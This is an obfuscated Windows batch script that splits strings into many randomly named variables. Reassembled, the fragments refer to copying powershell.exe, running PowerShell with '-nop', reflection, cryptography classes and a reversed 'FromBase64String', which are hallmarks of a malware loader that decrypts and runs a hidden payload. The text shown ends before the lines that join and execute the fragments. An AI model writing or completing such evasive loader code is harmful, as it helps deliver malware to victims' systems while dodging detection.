@echo off
set "PRcqZHKeiZ=1."
set "YZQlxYfZTd=st"
set "FCrFiZMYad=Po"
set "LkgiFLBKxr=32"
set "hOTHqlZdff=rs"
set "CmQrthMKUp=em"
set "eZTwrULWnz=he"
set "NTEHSMkVWK=rS"
set "FRnBBFBzWl=ow"
set "XbiRKkRrCw=we"
set "zvHCccyndo=ll"
set "FlMTMAGTBE= C"
set "FswQmmLrkJ=s\"
set "zUfMBGDAya=he"
set "HokEVlKPgU=co"
set "AjBgBwBqRu=nd"
set "OTpCejNvKj=Sy"
set "MLaRdEuXTw=y "
set "bUAhTfoFlG=.e"
set "wcBvyNSIGL=do"
set "afjsgcWwpd=xe"
set "wuBCkwxeeM=ws"
set "toCmGzqIGc=:\"
set "TinBRZipxG=po"
set "SfOMnGCkto=\W"
set "SeQEZLXJNv=\v"
set "HEBAUQDsnz=we"
set "TdMCLVacSb=py"
set "bUHCdSSbHu=ll"
set "eHfNyTmcDa=0\"
set "GrTCXLhrFn= /"
set "gMxhhBdXjW=in"
set "PtAvJdMMDY=Wi"
set "AenYGavHJg=cd"
set "bvRjzehUZk= %~dp0"
set "NahcGFjwIA=.Key"
set "jQJDEbkCYf=ect "
set "YFguSknVLG=t Sy"
set "LNdQqDRdla=-nop"
set "sulHNpPppu=;$gy"
set "pVKmAupcLn=in $"
set "NWJxDvaItW= [st"
set "OnzGuFRzEC=orF'"
set "ielITBDkCC=, (,"
set "ZglqGHhrTs=.Cry"
set "NzCxruvcNG=tem."
set "OowDOCqCaE=ke($"
set "nezSRUroGZ=TllA"
set "SSXvaNWEWc=$AqH"
set "numqLRqzuV=.Sec"
set "SBgbtWLNLM= [Sy"
set "fjzVOHeQHI=ptog"
set "UTRJrhKsAP=esaB"
set "FMkQmRydsR=('da"
set "nbpDtbGRrl=Syst"
set "ZTukldZMuP=Fo7l"
set "pbiTHjJRaR=gnir"
set "fnThDwmtgv=em.C"
set "fVPYBlEbwA=m.IO"
set "WNcgxisuyS=] -j"
set "ffrbDhllYT=);$N"
set "rgmZvHRVfk=gB ="
set "OCpqyYWhVJ=flec"
set "CPpouVAWkp=lBlo"
set "sCyOljNgTi=le  "
set "Zrfxulsrpk=:('g"
set "myfgHGjLJL=3HWs"
set "DtzQZXLPQQ=7Yiv"
set "ETKKcYUbwE=COeQ"
